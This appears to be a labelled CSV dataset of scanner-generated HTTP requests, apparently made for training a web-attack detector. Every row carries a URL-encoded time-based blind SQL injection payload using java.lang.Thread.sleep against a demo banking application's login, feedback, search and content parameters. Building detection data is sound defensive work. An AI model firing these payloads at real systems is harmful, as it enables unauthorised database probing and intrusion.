GET,/disclaimer.htm?url=http%3A%2F%2Fwww.netscape.com+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,206,0,4,1,"[4, 2, 1, 2, 17, 15, 0, 0, 0, 206, 3, 0]",1
GET,/index.jsp?content=inside_volunteering.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,81,0,1,1,"[0, 4, 0, 1, 4, 8, 0, 0, 0, 81, 3, 0]",1
GET,/Documents/JohnSmith/index.jsp?content=personal.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,215,0,4,1,"[5, 2, 1, 2, 17, 13, 0, 0, 0, 215, 3, 0]",1
GET,/survey_questions.jsp?step=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,178,0,4,1,"[5, 2, 1, 1, 14, 12, 1, 0, 0, 178, 3, 0]",1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,4,3,1,1,14,0,1,0,0,12,174,4,1,"[4, 3, 1, 1, 14, 12, 1, 0, 1, 12, 174, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,3,1,1,21,0,1,0,0,13,272,4,1,"[4, 3, 1, 1, 21, 12, 1, 0, 5, 13, 272, 0]",1
POST,/doLogin,uid=ZAP&passw=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&btnSubmit=Login,4,3,1,1,14,0,1,0,0,8,181,5,1,"[4, 3, 1, 1, 14, 12, 1, 0, 2, 8, 181, 0]",1
GET,/search.jsp?query=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,169,0,4,1,"[4, 2, 1, 1, 14, 12, 1, 0, 0, 169, 3, 0]",1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,3,0,0,0,0,93,0,1,1,"[0, 2, 0, 1, 3, 7, 0, 0, 0, 93, 3, 0]",1
GET,/static/index.jsp?content=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,177,0,4,1,"[4, 3, 1, 1, 14, 12, 1, 0, 0, 177, 3, 0]",1
GET,/images/index.jsp?content=personal.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,201,0,4,1,"[4, 2, 1, 2, 17, 12, 0, 0, 0, 201, 3, 0]",1
GET,/Privacypolicy.jsp?sec=Careers&template=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,190,0,4,1,"[4, 2, 1, 1, 14, 11, 1, 0, 1, 190, 3, 0]",1
GET,/index.jsp?content=inside_jobs.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&job=MortgageLendingAccountExecutive%3ASales,,4,2,1,2,17,0,0,0,0,239,0,4,1,"[4, 2, 1, 2, 17, 13, 0, 0, 1, 239, 3, 0]",1
GET,/disclaimer.htm?url=http%3A%2F%2Fwww.netscape.com%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,207,0,4,1,"[5, 2, 1, 2, 17, 16, 0, 0, 0, 207, 3, 0]",1
GET,/survey_questions.jsp?step=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,178,0,4,1,"[4, 3, 1, 1, 14, 12, 1, 0, 0, 178, 3, 0]",1
GET,/index.jsp?content=inside_volunteering.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,205,0,4,1,"[4, 2, 1, 2, 17, 12, 0, 0, 0, 205, 3, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,2,1,1,21,0,1,0,0,13,272,4,1,"[4, 2, 1, 1, 21, 12, 1, 0, 5, 13, 272, 0]",1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,4,2,1,1,14,0,1,0,0,12,174,4,1,"[4, 2, 1, 1, 14, 12, 1, 0, 1, 12, 174, 0]",1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,6,0,0,0,0,118,0,1,1,"[0, 2, 0, 1, 6, 8, 0, 0, 0, 118, 3, 0]",1
POST,/doLogin,uid=ZAP&passw=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&btnSubmit=Login,4,2,1,1,14,0,1,0,0,8,181,5,1,"[4, 2, 1, 1, 14, 12, 1, 0, 2, 8, 181, 0]",1
GET,/static/index.jsp?content=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,177,0,4,1,"[4, 2, 1, 1, 14, 12, 1, 0, 0, 177, 3, 0]",1
GET,/search.jsp?query=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,49,0,1,1,"[0, 2, 0, 1, 0, 4, 0, 0, 0, 49, 3, 0]",1
GET,/Privacypolicy.jsp?sec=Careers&template=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,191,0,4,1,"[5, 2, 1, 1, 14, 12, 1, 0, 1, 191, 3, 0]",1
GET,/index.jsp?content=inside_jobs.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&job=MortgageLendingAccountExecutive%3ASales,,5,2,1,2,17,0,0,0,0,240,0,4,1,"[5, 2, 1, 2, 17, 14, 0, 0, 1, 240, 3, 0]",1
GET,/images/index.jsp?content=personal.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,202,0,4,1,"[5, 2, 1, 2, 17, 13, 0, 0, 0, 202, 3, 0]",1
GET,/survey_questions.jsp?step=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,178,0,4,1,"[4, 2, 1, 1, 14, 12, 1, 0, 0, 178, 3, 0]",1
GET,/index.jsp?content=inside_volunteering.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,206,0,4,1,"[5, 2, 1, 2, 17, 13, 0, 0, 0, 206, 3, 0]",1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%22java.lang.Thread.sleep%22%2815000%29,0,2,0,1,0,0,0,0,0,12,54,1,1,"[0, 2, 0, 1, 0, 4, 0, 0, 1, 12, 54, 0]",1
POST,/doLogin,uid=ZAP&passw=%22java.lang.Thread.sleep%22%2815000%29&btnSubmit=Login,0,2,0,1,0,0,0,0,0,8,61,2,1,"[0, 2, 0, 1, 0, 4, 0, 0, 2, 8, 61, 0]",1
GET,/static/index.jsp?content=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,57,0,1,1,"[0, 2, 0, 1, 0, 4, 0, 0, 0, 57, 3, 0]",1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,7,0,0,0,0,122,0,1,1,"[2, 2, 0, 1, 7, 11, 0, 0, 0, 122, 3, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=%22java.lang.Thread.sleep%22%2815000%29&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,2,0,1,7,0,0,0,0,13,152,1,1,"[0, 2, 0, 1, 7, 4, 0, 0, 5, 13, 152, 0]",1
GET,/search.jsp?query=ZAP+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,56,0,1,1,"[0, 2, 0, 1, 3, 5, 0, 0, 0, 56, 3, 0]",1
GET,/Privacypolicy.jsp?sec=Careers&template=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,191,0,4,1,"[4, 3, 1, 1, 14, 12, 1, 0, 1, 191, 3, 0]",1
GET,/index.jsp?content=inside_jobs.htm&job=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,189,0,4,1,"[4, 2, 1, 1, 14, 11, 1, 0, 1, 189, 3, 0]",1
GET,/survey_questions.jsp?step=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,58,0,1,1,"[0, 2, 0, 1, 0, 4, 0, 0, 0, 58, 3, 0]",1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe+%2F+%22java.lang.Thread.sleep%22%2815000%29+,0,2,0,1,3,0,0,0,0,12,67,1,1,"[0, 2, 0, 1, 3, 5, 0, 0, 1, 12, 67, 0]",1
POST,/doLogin,uid=ZAP&passw=ZAP+%2F+%22java.lang.Thread.sleep%22%2815000%29+&btnSubmit=Login,0,2,0,1,3,0,0,0,0,8,68,2,1,"[0, 2, 0, 1, 3, 5, 0, 0, 2, 8, 68, 0]",1
GET,/static/index.jsp?content=personal_checking.htm+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,82,0,1,1,"[0, 2, 0, 1, 3, 5, 0, 0, 0, 82, 3, 0]",1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,7,0,0,0,0,122,0,1,1,"[0, 4, 0, 1, 7, 11, 0, 0, 0, 122, 3, 0]",1
GET,/search.jsp?query=ZAP%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,60,0,1,1,"[2, 2, 0, 1, 4, 8, 0, 0, 0, 60, 3, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP+%2F+%22java.lang.Thread.sleep%22%2815000%29+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,2,0,1,10,0,0,0,0,13,159,1,1,"[0, 2, 0, 1, 10, 5, 0, 0, 5, 13, 159, 0]",1
GET,/index.jsp?content=inside_jobs.htm&job=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,190,0,4,1,"[5, 2, 1, 1, 14, 12, 1, 0, 1, 190, 3, 0]",1
GET,/Privacypolicy.jsp?sec=Careers&template=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,191,0,4,1,"[4, 2, 1, 1, 14, 12, 1, 0, 1, 191, 3, 0]",1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,2,2,0,1,4,0,0,0,0,12,71,1,1,"[2, 2, 0, 1, 4, 8, 0, 0, 1, 12, 71, 0]",1
GET,/static/index.jsp?content=personal_checking.htm%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,86,0,1,1,"[2, 2, 0, 1, 4, 8, 0, 0, 0, 86, 3, 0]",1
GET,/survey_questions.jsp?step=d+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,63,0,1,1,"[0, 2, 0, 1, 3, 5, 0, 0, 0, 63, 3, 0]",1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,20,0,0,0,0,246,0,4,1,"[4, 2, 1, 2, 20, 15, 0, 0, 0, 246, 3, 0]",1
POST,/doLogin,uid=ZAP&passw=ZAP%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&btnSubmit=Login,2,2,0,1,4,0,0,0,0,8,72,2,1,"[2, 2, 0, 1, 4, 8, 0, 0, 2, 8, 72, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,2,0,1,11,0,0,0,0,13,163,1,1,"[2, 2, 0, 1, 11, 8, 0, 0, 5, 13, 163, 0]",1
GET,/search.jsp?query=ZAP%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,60,0,1,1,"[0, 4, 0, 1, 4, 8, 0, 0, 0, 60, 3, 0]",1
GET,/index.jsp?content=inside_jobs.htm&job=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,190,0,4,1,"[4, 3, 1, 1, 14, 12, 1, 0, 1, 190, 3, 0]",1
GET,/Privacypolicy.jsp?sec=Careers&template=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,71,0,1,1,"[0, 2, 0, 1, 0, 4, 0, 0, 1, 71, 3, 0]",1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,0,4,0,1,4,0,0,0,0,12,71,1,1,"[0, 4, 0, 1, 4, 8, 0, 0, 1, 12, 71, 0]",1
GET,/static/index.jsp?content=personal_checking.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,86,0,1,1,"[0, 4, 0, 1, 4, 8, 0, 0, 0, 86, 3, 0]",1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,20,0,0,0,0,247,0,4,1,"[5, 2, 1, 2, 20, 16, 0, 0, 0, 247, 3, 0]",1
GET,/survey_questions.jsp?step=d%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,67,0,1,1,"[2, 2, 0, 1, 4, 8, 0, 0, 0, 67, 3, 0]",1
GET,/search.jsp?query=ZAP+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,184,0,4,1,"[4, 2, 1, 2, 17, 12, 0, 0, 0, 184, 3, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,4,0,1,11,0,0,0,0,13,163,1,1,"[0, 4, 0, 1, 11, 8, 0, 0, 5, 13, 163, 0]",1
POST,/doLogin,uid=ZAP&passw=ZAP%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&btnSubmit=Login,0,4,0,1,4,0,0,0,0,8,72,2,1,"[0, 4, 0, 1, 4, 8, 0, 0, 2, 8, 72, 0]",1
GET,/index.jsp?content=inside_jobs.htm&job=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,190,0,4,1,"[4, 2, 1, 1, 14, 12, 1, 0, 1, 190, 3, 0]",1
GET,/Privacypolicy.jsp?sec=Careers&template=US+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,77,0,1,1,"[0, 2, 0, 1, 3, 5, 0, 0, 1, 77, 3, 0]",1
GET,/static/index.jsp?content=personal_checking.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,210,0,4,1,"[4, 2, 1, 2, 17, 12, 0, 0, 0, 210, 3, 0]",1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,4,2,1,2,17,0,0,0,0,12,195,4,1,"[4, 2, 1, 2, 17, 12, 0, 0, 1, 12, 195, 0]",1
GET,/survey_questions.jsp?step=d%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,67,0,1,1,"[0, 4, 0, 1, 4, 8, 0, 0, 0, 67, 3, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,2,1,2,24,0,0,0,0,13,287,4,1,"[4, 2, 1, 2, 24, 12, 0, 0, 5, 13, 287, 0]",1
POST,/doLogin,uid=ZAP&passw=ZAP+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&btnSubmit=Login,4,2,1,2,17,0,0,0,0,8,196,5,1,"[4, 2, 1, 2, 17, 12, 0, 0, 2, 8, 196, 0]",1
GET,/search.jsp?query=ZAP%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,185,0,4,1,"[5, 2, 1, 2, 17, 13, 0, 0, 0, 185, 3, 0]",1
GET,/index.jsp?content=inside_jobs.htm&job=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,70,0,1,1,"[0, 2, 0, 1, 0, 4, 0, 0, 1, 70, 3, 0]",1
GET,/Privacypolicy.jsp?sec=Careers&template=US%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,81,0,1,1,"[2, 2, 0, 1, 4, 8, 0, 0, 1, 81, 3, 0]",1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,5,2,1,2,17,0,0,0,0,12,196,4,1,"[5, 2, 1, 2, 17, 13, 0, 0, 1, 12, 196, 0]",1
GET,/static/index.jsp?content=personal_checking.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,211,0,4,1,"[5, 2, 1, 2, 17, 13, 0, 0, 0, 211, 3, 0]",1
GET,/survey_questions.jsp?step=d+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,191,0,4,1,"[4, 2, 1, 2, 17, 12, 0, 0, 0, 191, 3, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,5,2,1,2,24,0,0,0,0,13,288,4,1,"[5, 2, 1, 2, 24, 13, 0, 0, 5, 13, 288, 0]",1
POST,/doLogin,uid=ZAP&passw=ZAP%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&btnSubmit=Login,5,2,1,2,17,0,0,0,0,8,197,5,1,"[5, 2, 1, 2, 17, 13, 0, 0, 2, 8, 197, 0]",1
GET,/Privacypolicy.jsp?sec=Careers&template=US%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,81,0,1,1,"[0, 4, 0, 1, 4, 8, 0, 0, 1, 81, 3, 0]",1
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,111,0,1,1,"[0, 2, 0, 1, 3, 6, 0, 0, 1, 111, 3, 0]",1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,4,2,1,1,14,0,1,0,0,8,178,5,1,"[4, 2, 1, 1, 14, 11, 1, 0, 2, 8, 178, 0]",1
GET,/survey_questions.jsp?step=d%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,192,0,4,1,"[5, 2, 1, 2, 17, 13, 0, 0, 0, 192, 3, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,2,1,1,21,0,1,0,0,13,271,4,1,"[4, 2, 1, 1, 21, 11, 1, 0, 5, 13, 271, 0]",1
